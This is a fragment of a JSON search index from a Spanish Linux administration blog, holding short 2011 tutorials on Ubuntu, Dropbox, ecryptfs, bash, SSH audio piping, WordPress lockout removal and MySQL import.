}","tags":"memo","url":"https://karpoke.ignaciocano.com/2011/05/18/0-factorial-igual-1-factorial/","loc":"https://karpoke.ignaciocano.com/2011/05/18/0-factorial-igual-1-factorial/"},{"title":"Aplicaciones en el área de notificación de Ubuntu Natty Narwhal","text":"Con la llegada de la nueva Ubuntu, se ha cambiado el área de notificación por una nueva API . Para las aplicaciones que todavía no se han adaptado, se ha habilitado una lista blanca de aplicaciones que pueden utilizar la antigua área de notificación, hasta que se actualicen. Para ver qué aplicaciones hay en la lista: bash $ gsettings get com.canonical.Unity.Panel systray-whitelist ['JavaEmbeddedFrame', 'Mumble', 'Wine', 'Skype', 'hp-systray', 'scp-dbus-service'] Para añadir una aplicación, por ejemplo, dropbox : bash $ gsettings get com.canonical.Unity.Panel systray-whitelist ['JavaEmbeddedFrame', 'Mumble', 'Wine', 'Skype', 'hp-systray', 'scp-dbus-service', 'dropbox'] Para volver a los valores originales: bash $ gsettings reset com.canonical.Unity.Panel systray-whitelist Actualizado el 4 de febrero de 2012 El truco sigue funcionando en Ubuntu Oneiric Ocelot (11.10). Si queremos que el icono de Dropbox aparezca sin tener que cerrar la sesión, podemos matar el proceso y volverlo a arrancar: bash $ killall dropbox $ /usr/bin/dropbox Si estamos utilizando múltiples cuentas de Dropbox , podemos hacer lo mismo, pero lanzando el script , en lugar del comando dropbox directamente: bash $ killall dropbox $ MultipleDropboxInstances.sh","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/05/12/aplicaciones-en-el-area-de-notificacion-de-ubuntu-natty-narwhal/","loc":"https://karpoke.ignaciocano.com/2011/05/12/aplicaciones-en-el-area-de-notificacion-de-ubuntu-natty-narwhal/"},{"title":"Copiar un directorio excluyendo los archivos de una clase","text":"Si queremos copiar un directorio pero no queremos que se copien los archivos .svn , o .dropbox , podemos ejecutar: bash $ rsync -r --exclude=.dropbox /path/source/dir /path/destination","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/05/11/copiar-un-directorio-excluyendo-los-archivos-de-una-clase/","loc":"https://karpoke.ignaciocano.com/2011/05/11/copiar-un-directorio-excluyendo-los-archivos-de-una-clase/"},{"title":"Nombres de fichero con espacios en Bash","text":"Si queremos recorrer un directorio y hacer algo con cada fichero o subdirectorio contenido en él, podemos ejecutar algo como: bash $ for f in *; do echo \"$f\"; done En lugar de utilizar un for , también podríamos usar el comando find con el parámetro exec : bash $ find . -maxdepth 1 \\( -name '*' ! -name '.' \\) -exec echo {} \\; O en lugar del exec con un while : bash $ find . -maxdepth 1 \\( -name '*' ! -name '.' \\) | while read f; do echo \"$f\"; done Un par de cosas: es importante que el asterisco esté entre comillas simples, '*' , o escaparlo con una barra invertida, \\* , para que Bash no lo expanda, utilizar comillas dobles cuando usamos la variable, \"$f\" , para que al expandirla, se trate el nombre entero incluyendo los espacios, y mediante -name '*' ! -name '.' , find devolverá todos los ficheros y directorios menos el directorio especial . . También podríamos usar el comando ls con el argumento -b , que escapa los espacios: bash $ ls -b * | while read f; do echo \"$f\"; done","tags":"dev","url":"https://karpoke.ignaciocano.com/2011/05/11/nombres-de-fichero-con-espacios-en-bash/","loc":"https://karpoke.ignaciocano.com/2011/05/11/nombres-de-fichero-con-espacios-en-bash/"},{"title":"Recuperar los datos guardados en una sesión livecd","text":"Si habíamos estado trabajando en una sesión livecd , más tarde podemos recuperar los datos que hayamos guardado en dicha sesión montando el usb : bash $ sudo mount /media/miusb/casper.rw /mnt -o loop","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/05/11/recuperar-los-datos-guardados-en-una-sesion-livecd/","loc":"https://karpoke.ignaciocano.com/2011/05/11/recuperar-los-datos-guardados-en-una-sesion-livecd/"},{"title":"Comprobar a dónde nos lleva un enlace corto","text":"Un enlace corto es útil, por ejemplo, para incluir la dirección de una página web en servicios como Twitter , donde el número de caracteres está limitado. Sin embargo, se pueden utilizar para engañarnos y llevarnos a una página que no queramos, o incluso que distribuya malware . Para comprobar hacia dónde apunta un enlaces cortos podemos: utilizar un servicio como urlxray utilizar el comando curl : bash $ curl -sI http://goo.gl/GPb7Z | grep Location Location: http://terminus.homelinux.com/k/ utilizar un complemento para Firefox","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/05/07/comprobar-a-donde-nos-lleva-un-enlace-corto/","loc":"https://karpoke.ignaciocano.com/2011/05/07/comprobar-a-donde-nos-lleva-un-enlace-corto/"},{"title":"Sonido a través de SSH","text":"Si tenemos acceso por ssh a otro ordenador, ambos con micrófono y altavoces, podemos redirigir el sonido en ambos sentidos, es decir, podemos conseguir cosas como: que lo que capta nuestro micrófono se escuche en los altavoces del otro ordenador y viceversa que lo que se escribe en un ordenador se escuche en el otro y viceversa que el contenido de un fichero de texto se oiga en los altavoces remotos y viceversa que un archivo de audio se escuche en los altavoces remotos y viceversa que el audio de un archivo de vídeo se escuche en los altavoces remotos y viceversa Dispositivos de sonido en Ubuntu Maverick Meerkat Uno de los cambios de Ubuntu Maverick Meerkat (10.10) fue la desaparición del dispositivo /dev/dsp y otros, como /dev/mixer , /dev/sndstat y /dev/audio , al utilizar la interfaz ALSA en detrimento de la OSS API . Para los programas que tengan problemas para utilizar la API ALSA, existen los comandos esddsp , que permite redirigir datos de audio no-esd a través de esd y padsp , que permite lo mismo pero mediante PulseAudio. Fuente: es.wikipedia.org Redirigir el micrófono local a los altavoces remotos Si disponemos de /dev/dsp en ambas máquinas podemos utilizar dd : bash $ dd if=/dev/dsp | ssh -c arcfour -C user@host dd of=/dev/dsp La opción -c permite especificar el tipo de cifrado, y la opción -C que se utilice compresión de datos, utilizando el mismo algoritmo empleado por gzip . También podemos utilizar aplay : bash $ arecord -f dat | ssh -C user@host aplay -f dat La opción -f permite especificar el formato: -f cd (16 bit little endian, 44100, stereo) [-f S16_LE -c2 -r44100] -f cdr (16 bit big endian, 44100, stereo) [-f S16_BE -c2 -f44100] -f dat (16 bit little endian, 48000, stereo) [-f S16_LE -c2 -r48000] Por defecto, se utiliza (8 bit little endian, 8000, mono) [-f U8 -c1 -r8000] Redirigir el micrófono remoto a los altavoces locales Como en el caso anterior, pero a la inversa: bash $ ssh -C user@host arecord -f dat | aplay -f dat Si queremos guardar el audio que recibimos mientras lo escuchamos: bash $ ssh -C user@host arecord -f dat | tee audio.wav | aplay -f dat Supongo que también se debe poder utilizar dd para traer el sonido captado por un micrófono remoto, pero no lo he podido probar. Enviar texto y que se oiga por los altavoces remotos El texto puede ser algo que acabemos de escribir, el contenido de un fichero o la salida por stdout de un script . Para esto, podemos utilizar cualquier sintentizador de voz, por ejemplo, espeak o festival . bash $ echo \"Hola, mundo\" | ssh user@host espeak -ves $ echo \"Hello, world\" | ssh user@host espeak $ echo \"I am an alien\" | ssh user@host festival --tts $ echo \"Una ranita iba caminando\" | ssh user@host festival --tts --language spanish $ cat textos.txt | ssh user@host espeak -ves $ w3m -dump http://www.gnu.org/licenses/gpl-2.0.txt | ssh user@host espeak Si queremos parar la locución, deberemos iniciar sesión en la máquina remota y matar el proceso espeak o festival . Dicho sea de paso, para escuchar la voz en castellano usando el festival hay que instalar el paquete festvox-ellpc11k . Recibir texto y que se oiga por nuestros altavoces El caso inverso al anterior: bash $ ssh user@host cat textos.txt | espeak -ves $ ssh user@host w3m -dump http://www.gnu.org/licenses/gpl-2.0.txt | espeak Reproducir un archivo de audio en los altavoces remotos Para escuchar un archivo de audio remoto utilizaremos mplayer : bash $ cat podcast.ogg | ssh -C user@host mplayer - Reproducir un archivo de audio de la máquina remota en local Al revés del caso anterior. bash $ ssh -C user@host cat podcast.ogg | mplayer - Reproducir el sonido de un video en los altavoces remotos Es idéntico al caso de un archivo de audio, pero le pasamos a mplayer el argumento -vc null para que no decodifique el vídeo. bash $ ssh -C user@host cat podcast.ogg | mplayer -vc null - Reproducir el sonido de un vídeo remoto en nuestra máquina Podemos conseguir que se vea y escuche el vídeo: bash $ ssh -C user@host cat movie.ogv | mplayer - O que sólo se escuche el audio: bash $ ssh -C user@host cat movie.ogv | mplayer -vc null -","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/05/05/sonido-a-traves-de-ssh/","loc":"https://karpoke.ignaciocano.com/2011/05/05/sonido-a-traves-de-ssh/"},{"title":"Cifrar el contenido de Dropbox","text":"A raíz del cambio en los términos del servicio de Dropbox, en el cual se afirma que le entregará tus ficheros al gobierno de Estados Unidos , si éste se lo pide, o la noticia de que es posible saltarse las restricciones , y que nuestra cuenta sea usada en otra máquina sin necesidad de conocer nuestra contraseña, se nos podría ocurrir cifrar los datos que subimos a nuestra cuenta. Utilizaremos ecryptfs para cifrar un directorio, y todo su contenido, dentro del directorio de una de nuestras cuentas de Dropbox . Fuente: Linux Journal Supongamos que el directorio Dropbox se encuentra en /home/user/.dropbox/Dropbox . Crearemos dos directorios, uno dentro de este directorio, con el contenido cifrado , y otro fuera, donde lo montaremos: ```bash $ mkdir -m 500 ~/ecryptDropbox $ mkdir -m 700 ~/.dropbox/Dropbox/ecryptDropbox $ sudo mount -t ecryptfs ~/.dropbox/Dropbox/ecryptDropbox ~/ecryptDropbox Passphrase: Select cipher: 1) aes: blocksize = 16; min keysize = 16; max keysize = 32 (not loaded) 2) blowfish: blocksize = 16; min keysize = 16; max keysize = 56 (not loaded) 3) des3_ede: blocksize = 8; min keysize = 24; max keysize = 24 (not loaded) 4) twofish: blocksize = 16; min keysize = 16; max keysize = 32 (not loaded) 5) cast6: blocksize = 16; min keysize = 16; max keysize = 32 (not loaded) 6) cast5: blocksize = 8; min keysize = 5; max keysize = 16 (not loaded) Selection [aes]: Select key bytes: 1) 16 2) 32 3) 24 Selection [16]: 2 \"16\" Enable plaintext passthrough (y/n) [n]: Enable filename encryption (y/n) [n]: y \"n\" Filename Encryption Key (FNEK) Signature [f873fb2794e1bb82]: Attempting to mount with the following options: ecryptfs_unlink_sigs ecryptfs_fnek_sig=f873fb2794e1bb82 ecryptfs_key_bytes=32 ecryptfs_cipher=aes ecryptfs_sig=f873fb2794e1bb82 WARNING: Based on the contents of [/root/.ecryptfs/sig-cache.txt], it looks like you have never mounted with this key before. This could mean that you have typed your passphrase wrong. Would you like to proceed with the mount (yes/no)? : yes Would you like to append sig [f873fb2794e1bb82] to [/root/.ecryptfs/sig-cache.txt] in order to avoid this warning in the future (yes/no)? : yes Mounted eCryptfs ``` La passphrase es la contraseña utilizada para montar el directorio. Luego especificamos el algoritmo de cifrado y la longitud de la clave. La opción passthrought permite guardar ficheros sin cifrar. Luego podemos escoger cifrar también los nombres de fichero, e incluso escoger una clave distinta para el nombre y para el fichero. Este es el contenido que tendremos en nuestra cuenta de Dropbox: bash $ touch ~/ecryptDropbox/myfile $ ls ~/.dropbox/Dropbox/ecryptDropbox ECRYPTFS_FNEK_ENCRYPTED.FWbsAyi5CB4yVkY0czFjSWaXh52n0e59-VIQYq1x1vpJm6ZBDtj-4PILQwWaU-- !Dropbox ecryptfs Para que el directorio se monte al arrancar el sistema deberemos añadir al fichero /etc/fstab , pasándole las opciones directamente: bash /home/user/.dropbox/Dropbox/ecryptDropbox /home/user/ecryptDropbox ecryptfs user,rw,ecryptfs_sig=f873fb2794e1bb82,ecryptfs_fnek_sig=f873fb2794e1bb82,ecryptfs_key_bytes=32,ecryptfs_cipher=aes,ecryptfs_unlink_sigs,ecryptfs_passthrough=no,key=passphrase:passwd=UsedPasswordToEncrypt 0 0 A la hora de montarlo, deberemos especificar las opciones que hemos escogido a la hora de crearlo: ecryptfs_sig : es la clave que se utiliza para cifrar los ficheros. ecryptfs_fnek_sig : es la clave que se utiliza para cifrar los nombres de los ficheros. ecryptfs_cipher : es el algoritmo de cifrado a utilizar. ecryptfs_key_bytes : es la longitud de la clave para cifrar. ecryptfs_passthrough : especifica si se va a permitir guardar ficheros sin cifrar. ecryptfs_unlink_sigs : especifica que se vacie el anillo de claves cada vez que se desmonta el directorio, key=tipo:opciones . especifica el tipo de contraseña que vamos a utilizar y algunas opciones. El tipo se corresponde con uno de los módulos instalados en /usr/lib*/ecryptfs/ , como mínimo suelen ser passphrase y ssl . Las opciones pueden ser: passwd para especificar la contraseña directamente, passwd_file para utilizar un fichero que contiene la contraseña en la forma passwd=contraseña , passwd_fd para utilizar un descriptor de fichero, passstdin para pedir la contraseña al usuario, salt para especificar un valor hexadecimal de 16 bits como la sal, keyfile para especificar el fichero que contiene una clave SSL o RSA. Si queremos que nos pida la contraseña cada vez que se monte, en lugar de la línea anterior, pondríamos: bash /home/user/.dropbox/Dropbox/ecryptDropbox /home/user/ecryptDropbox ecryptfs user,rw,noauto,ecryptfs_sig=f873fb2794e1bb82,ecryptfs_fnek_sig=f873fb2794e1bb82,ecryptfs_key_bytes=32,ecryptfs_cipher=aes,ecryptfs_unlink_sigs,ecryptfs_passthrough=no 0 0 Para comprobar que funciona correctamente, desmontamos previamente el directorio y lo volvemos a montar: bash $ sudo umount ~/ecryptDropbox $ mount ~/ecryptDropbox -o ecryptfs_sig=f873fb2794e1bb82,ecryptfs_fnek_sig=f873fb2794e1bb82,ecryptfs_key_bytes=32,ecryptfs_cipher=aes,ecryptfs_unlink_sigs,ecryptfs_passthrough=no Passphrase: Si esto nos devuelve el siguiente error: bash Error attempting to evaluate mount options: [-22] Invalid argument Check your system logs for details on why this happened. Try updating your ecryptfs-utils package, and/or submit a bug report on https://launchpad.net/ecryptfs Tenemos dos opciones , o bien añadimos el [bit de sutuid ][] al comando mount.ecryptfs , o bien lo montamos como root . Referencias En el directorio público de mi cuenta de Dropbox tengo subidos varios ezines sobre GNU/Linux, software libre, programación y seguridad . En el directorio público de Ubuntu One tengo subidos varios libros y artículos sobre GNU/Linux, software libre, programación y seguridad .","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/04/21/cifrar-el-contenido-de-dropbox/","loc":"https://karpoke.ignaciocano.com/2011/04/21/cifrar-el-contenido-de-dropbox/"},{"title":"Acceder al panel de control de Wordpress tras haber sido baneado","text":"De forma similar a fail2ban para ssh , existe un complemento para Wordpress, Login LockDown , que controla el número de intentos de acceso al panel de control, y si se falla en 3 intentos, banea dicha IP durante una hora. Estos parámetros, y alguno más, son configurables desde la página de configuración del complemento. El problema es que si compartimos la misma IP pública con más gente, ya sea porque estamos en un lugar público o en casa de unos amigos, y alguien en esta misma red realiza más intentos de los permitidos, también nosotros quedamos baneados . Si tenemos acceso por ssh al servidor donde se encuentra la base de datos, podemos hacer lo siguiente para desbanearnos: bash $ mysql -u wordpress -p wordpress mysql> select * from wp_lockdowns; +-------------+---------+---------------------+---------------------+--------------+ | lockdown_ID | user_id | lockdown_date | release_date | lockdown_IP | +-------------+---------+---------------------+---------------------+--------------+ | 1 | 1 | 2011-04-19 18:58:05 | 2011-04-19 19:58:05 | 80.58.0.33 | +-------------+---------+---------------------+---------------------+--------------+ 1 row in set (0.00 sec) mysql> delete from wp_lockdowns where lockdown_ID=1; Query OK, 1 row affected (0.00 sec)","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/04/20/acceder-al-panel-de-control-de-wordpress-tras-haber-sido-baneado/","loc":"https://karpoke.ignaciocano.com/2011/04/20/acceder-al-panel-de-control-de-wordpress-tras-haber-sido-baneado/"},{"title":"true","text":"```bash $ man true NAME true - do nothing, successfully SYNOPSIS true [ignored command line arguments] true OPTION DESCRIPTION Exit with a status code indicating success. --help display this help and exit --version output version information and exit NOTE: your shell may have its own version of true, which usually supersedes the version described here. Please refer to your shell's documentation for details about the options it supports. ``` No hay nada como hacer sólo una cosa, pero hacerla bien...","tags":"memo","url":"https://karpoke.ignaciocano.com/2011/04/19/true/","loc":"https://karpoke.ignaciocano.com/2011/04/19/true/"},{"title":"Múltiples cuentas de Dropbox en Ubuntu Maverick Meerkat","text":"Una cuenta gratuita de Dropbox permite inicialmente 2 GB de espacio, que se pueden ir ampliando con algunas sencillas acciones tales como compartir un directorio, instalar el paquete para Ubuntu o recomendárselo a un amigo. En principio, sólo se puede tener una cuenta por dispositivo. Sin embargo, como vamos a ver, gestionar varias cuentas para obtener más espacio, utilizándolas a la vez y desde la misma máquina, es algo realmente sencillo y rápido. Creamos una nueva cuenta Lo mejor es mandarnos una invitación a nosotros mismos y así conseguir 250MB de espacio adicional para cada una. Si nos habíamos registrado con una cuenta de GMail, podemos poner la misma cuenta de correo, introduciendo uno o varios puntos en el nombre de usuario, por ejemplo, user.name@gmail.com . Creamos el directorio para la nueva cuenta: bash $ mkdir ~/.dropbox2 Lanzamos la instalación en este directorio: bash $ HOME=~/.dropbox2 /usr/bin/dropbox start -i Sin embargo, en Ubuntu Maverick Meerkat da el siguiente error: bash Starting Dropbox...Traceback (most recent call last): File \"/usr/bin/dropbox\", line 259, in handle_ok self.dont_show_again_align.hide() AttributeError: 'DownloadDialog' object has no attribute 'dont_show_again_align' Vamos a ver que pasa si comentamos la línea 259 en el fichero /usr/bin/dropbox : ```bash self.dont_show_again_align.hide() ``` Actualizado el 4 de febrero de 2012 Este fichero viene con el paquete nautilus-dropbox . La versión que tengo instalada es la 0.6.8, pero actualmente ya van por la versión 0.7.1 , por lo que es posible que el número de línea haya cambiado . Lo volvemos a ejecutar, y funciona! Nos aparecerá el asistente y configuramos la nueva cuenta o creamos una. El directorio de la nueva cuenta de Dropbox está en ~/.dropbox2/Dropbox . Gestionar varias cuentas Ahora, para que sea más sencillo gestionar todas las cuentas y que se ejecuten al inicio, haremos lo siguiente. Desactivamos el autoarranque de la cuenta de Dropbox que ya teníamos. Para tenerlo todo un poco más ordenado, vamos a mover las credenciales de la cuenta que ya teníamos al directorio ~/.dropbox1 : bash $ cd ~ $ mkdir .dropbox1 $ mv .dropbox .dropbox-dist Dropbox .dropbox1 $ ln -s .Xauthority .dropbox $ ln -s .Xauthority .dropbox2 Nos debería quedar así: bash $ ls -lan .dropbox1 total 28 drwxr-xr-x 5 1000 1000 4096 2011-03-30 14:13 . drwxr-xr-x 157 1000 1000 12288 2011-03-30 14:16 .. drwxr-xr-x 3 1000 1000 4096 2011-03-30 13:45 .dropbox drwxr-xr-x 6 1000 1000 4096 2011-03-30 13:02 Dropbox drwxr-xr-x 4 1000 1000 4096 2010-10-28 11:43 .dropbox-dist lrwxrwxrwx 1 1000 1000 14 2011-03-30 14:13 .Xauthority -> ../.Xauthority $ ls -lan .dropbox2 total 28 drwxr-xr-x 5 1000 1000 4096 2011-03-30 14:13 . drwxr-xr-x 157 1000 1000 12288 2011-03-30 14:16 .. drwxr-xr-x 3 1000 1000 4096 2011-03-30 13:46 .dropbox drwxr-xr-x 5 1000 1000 4096 2011-03-30 13:36 Dropbox drwxr-xr-x 5 1000 1000 4096 2011-03-30 13:33 .dropbox-dist lrwxrwxrwx 1 1000 1000 14 2011-03-30 14:13 .Xauthority -> ../.Xauthority El siguiente script , MultipleDropboxInstances.sh , se encarga de lanzar una instancia de Dropbox por cada cuenta que tengamos instalada: ```bash !/bin/bash * * * * * Multiple dropbox instances * * * * * dropboxes=\".dropbox .dropbox2\" for dropbox in \\(dropboxes do HOME=/home/\\) USER if ! [ -d \\(HOME/\\) dropbox ];then mkdir \\(HOME/\\) dropbox 2> /dev/null ln -s \\(HOME/.Xauthority $HOME/\\) dropbox/ 2> /dev/null fi HOME=$HOME/$dropbox /usr/bin/dropbox start -i 2> /dev/null & done ``` Le damos permisos de ejecución: bash $ chmod +x MultipleDropboxInstances.sh Lo ejecutamos: bash $ ./MultipleDropboxInstances.sh Starting Dropbox...Starting Dropbox...Done! Done! En la barra superior nos aparecerán dos iconos de Dropbox, uno por cada cuenta. Si utilizamos Unity y no nos aparece, podemos recurrir a un truco para añadir el icono de Dropbox al área de notificación . Actualizado el 17 de marzo de 2012 La versión actual de Dropbox, 0.7.1, es compatible con Unity, por lo que no es necesario recurrir al truco mencionado. Para que se ejecute cada vez al inicio, en el fichero /etc/rc.local , añadimos: bash su username /home/username/MultipleDropboxInstances.sh Referencias En el directorio público de mi cuenta de Dropbox tengo subidos varios ezines sobre GNU/Linux, software libre, programación y seguridad . En el directorio público de Ubuntu One tengo subidos varios libros y artículos sobre GNU/Linux, software libre, programación y seguridad . if (!document.getElementById('mathjaxscript_pelican_#%@#$@#')) { var align = \"center\", indent = \"0em\", linebreak = \"false\"; if (false) { align = (screen.width < 768) ? \"left\" : align; indent = (screen.width < 768) ? \"0em\" : indent; linebreak = (screen.width < 768) ? 'true' : linebreak; } var mathjaxscript = document.createElement('script'); mathjaxscript.id = 'mathjaxscript_pelican_#%@#$@#'; mathjaxscript.type = 'text/javascript'; mathjaxscript.src = 'https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.3/latest.js?config=TeX-AMS-MML_HTMLorMML'; var configscript = document.createElement('script'); configscript.type = 'text/x-mathjax-config'; configscript[(window.opera ? \"innerHTML\" : \"text\")] = \"MathJax.Hub.Config({\" + \" config: ['MMLorHTML.js'],\" + \" TeX: { extensions: ['AMSmath.js','AMSsymbols.js','noErrors.js','noUndefined.js'], equationNumbers: { autoNumber: 'none' } },\" + \" jax: ['input/TeX','input/MathML','output/HTML-CSS'],\" + \" extensions: ['tex2jax.js','mml2jax.js','MathMenu.js','MathZoom.js'],\" + \" displayAlign: '\"+ align +\"',\" + \" displayIndent: '\"+ indent +\"',\" + \" showMathMenu: true,\" + \" messageStyle: 'normal',\" + \" tex2jax: { \" + \" inlineMath: [ ['\\\\\\\\(','\\\\\\\\)'] ], \" + \" displayMath: [ ['$$','$$'] ],\" + \" processEscapes: true,\" + \" preview: 'TeX',\" + \" }, \" + \" 'HTML-CSS': { \" + \" availableFonts: ['STIX', 'TeX'],\" + \" preferredFont: 'STIX',\" + \" styles: { '.MathJax_Display, .MathJax .mo, .MathJax .mi, .MathJax .mn': {color: 'inherit ! important'} },\" + \" linebreaks: { automatic: \"+ linebreak +\", width: '90% container' },\" + \" }, \" + \"}); \" + \"if ('default' !== 'default') {\" + \"MathJax.Hub.Register.StartupHook('HTML-CSS Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax['HTML-CSS'].FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"MathJax.Hub.Register.StartupHook('SVG Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax.SVG.FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"}\"; (document.body || document.getElementsByTagName('head')[0]).appendChild(configscript); (document.body || document.getElementsByTagName('head')[0]).appendChild(mathjaxscript); }","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/03/30/multiples-cuentas-de-dropbox-en-ubuntu-maverick-meerkat/","loc":"https://karpoke.ignaciocano.com/2011/03/30/multiples-cuentas-de-dropbox-en-ubuntu-maverick-meerkat/"},{"title":"Encuentra las diferencias... desde el terminal","text":"Supongamos que queremos encontrar las diferencias en la siguiente imagen: Fuente: taringa.net Tal como se muestra en la tira cómica, se puede hacer utilizando las herramientas de la suite imagemagick , en particular, composite . Primero, creamos una imagen con cada mitad de la imagen original: bash $ convert diferencias.jpg -crop 50%x100% out.png Esto crea dos ficheros, out-0.png y out-0.png , uno con la mitad izquierda y otro con la mitad izquierda. Vamos a obtener las diferencias: bash $ composite out-0.png out-1.png -compose difference diferencias-out.png","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/03/29/encuentra-las-diferencias-desde-el-terminal/","loc":"https://karpoke.ignaciocano.com/2011/03/29/encuentra-las-diferencias-desde-el-terminal/"},{"title":"Desordenando listas en Python","text":"Si tenemos una lista de elementos, por ejemplo: ```python l = [ 2, 3, 5, 7, 11, 13, 17, 19 ] ``` Y queremos desordenarla, pero con la condición de que ningún elemento ocupe la misma posición que ocupaba originalmente, podemos aplicar el algoritmo de Sottolo : ```python from random import randrange def sattoloCycle(items): ... i = len(items) ... while i > 1: ... i = i - 1 ... j = randrange(i) # 0 < = j <= i-1 ... items[j], items[i] = items[i], items[j] ... return ``` ```python sattoloCycle(l) print l [5, 17, 3, 2, 7, 11, 13] ```","tags":"dev","url":"https://karpoke.ignaciocano.com/2011/03/29/desordenando-listas-en-python/","loc":"https://karpoke.ignaciocano.com/2011/03/29/desordenando-listas-en-python/"},{"title":"LaTeX en Wordpress","text":"Descarga el plugin de LaTeX para Wordpress . Luego, escribe: latex \\large\\begin{align*} ax&#94;2+bx+c &= 0 \\\\ x&#94;2+\\frac{b}{a}x+\\frac{c}{a} &= 0 \\\\ x&#94;2+\\frac{b}{a}x &= -\\frac{c}{a} \\\\ x&#94;2+\\frac{b}{a}x+\\frac{b&#94;2}{4a&#94;2} &= \\frac{b&#94;2}{4a&#94;2} - \\frac{c}{a} \\\\ (x+\\frac{b}{2a})&#94;2 &= \\frac{b&#94;2}{4a&#94;2} - \\frac{4ac}{4a&#94;2} \\\\ x+\\frac{b}{2a} &= \\pm\\sqrt{\\frac{b&#94;2-4ac}{4a&#94;2}} \\\\ x+\\frac{b}{2a} &= \\frac{\\pm\\sqrt{b&#94;2-4ac}}{2a} \\\\ x &= \\frac{-b\\pm\\sqrt{b&#94;2-4ac}}{2a} \\end{align*} El resultado será parecido a éste: $$ \\large\\begin{align*} ax&#94;2+bx+c &= 0 \\\\ x&#94;2+\\frac{b}{a}x+\\frac{c}{a} &= 0 \\\\ x&#94;2+\\frac{b}{a}x &= -\\frac{c}{a} \\\\ x&#94;2+\\frac{b}{a}x+\\frac{b&#94;2}{4a&#94;2} &= \\frac{b&#94;2}{4a&#94;2} - \\frac{c}{a} \\\\ (x+\\frac{b}{2a})&#94;2 &= \\frac{b&#94;2}{4a&#94;2} - \\frac{4ac}{4a&#94;2} \\\\ x+\\frac{b}{2a} &= \\pm\\sqrt{\\frac{b&#94;2-4ac}{4a&#94;2}} \\\\ x+\\frac{b}{2a} &= \\frac{\\pm\\sqrt{b&#94;2-4ac}}{2a} \\\\ x &= \\frac{-b\\pm\\sqrt{b&#94;2-4ac}}{2a} \\end{align*} $$ if (!document.getElementById('mathjaxscript_pelican_#%@#$@#')) { var align = \"center\", indent = \"0em\", linebreak = \"false\"; if (false) { align = (screen.width < 768) ? \"left\" : align; indent = (screen.width < 768) ? \"0em\" : indent; linebreak = (screen.width < 768) ? 'true' : linebreak; } var mathjaxscript = document.createElement('script'); mathjaxscript.id = 'mathjaxscript_pelican_#%@#$@#'; mathjaxscript.type = 'text/javascript'; mathjaxscript.src = 'https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.3/latest.js?config=TeX-AMS-MML_HTMLorMML'; var configscript = document.createElement('script'); configscript.type = 'text/x-mathjax-config'; configscript[(window.opera ? \"innerHTML\" : \"text\")] = \"MathJax.Hub.Config({\" + \" config: ['MMLorHTML.js'],\" + \" TeX: { extensions: ['AMSmath.js','AMSsymbols.js','noErrors.js','noUndefined.js'], equationNumbers: { autoNumber: 'none' } },\" + \" jax: ['input/TeX','input/MathML','output/HTML-CSS'],\" + \" extensions: ['tex2jax.js','mml2jax.js','MathMenu.js','MathZoom.js'],\" + \" displayAlign: '\"+ align +\"',\" + \" displayIndent: '\"+ indent +\"',\" + \" showMathMenu: true,\" + \" messageStyle: 'normal',\" + \" tex2jax: { \" + \" inlineMath: [ ['\\\\\\\\(','\\\\\\\\)'] ], \" + \" displayMath: [ ['$$','$$'] ],\" + \" processEscapes: true,\" + \" preview: 'TeX',\" + \" }, \" + \" 'HTML-CSS': { \" + \" availableFonts: ['STIX', 'TeX'],\" + \" preferredFont: 'STIX',\" + \" styles: { '.MathJax_Display, .MathJax .mo, .MathJax .mi, .MathJax .mn': {color: 'inherit ! important'} },\" + \" linebreaks: { automatic: \"+ linebreak +\", width: '90% container' },\" + \" }, \" + \"}); \" + \"if ('default' !== 'default') {\" + \"MathJax.Hub.Register.StartupHook('HTML-CSS Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax['HTML-CSS'].FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"MathJax.Hub.Register.StartupHook('SVG Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax.SVG.FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"}\"; (document.body || document.getElementsByTagName('head')[0]).appendChild(configscript); (document.body || document.getElementsByTagName('head')[0]).appendChild(mathjaxscript); }","tags":"dev","url":"https://karpoke.ignaciocano.com/2011/03/29/latex-en-wordpress/","loc":"https://karpoke.ignaciocano.com/2011/03/29/latex-en-wordpress/"},{"title":"Importar un volcado de datos en MySQL","text":"Para realizar un volcado de datos, podemos ejecutar: bash $ mysqldump -uuser -p --all-databases --host localhost > mysql.sql Fuente: luauf.com Para importar este volcado, existe la herramienta mysqlimport : bash $ mysqlimport -uuser -hhost -p --local dbname mysql.sql Sin embargo, no me acaba de ir bien, ya que me devuelve este error: bash mysqlimport: Error: 1146, Table 'dbname.mysql' doesn't exist, when using table: mysql Una forma de conseguir restaurar el volcado de datos es desde el cliente de mysql : bash $ mysql -uuser -p dbname mysql> source mysql.sql; mysql> exit; 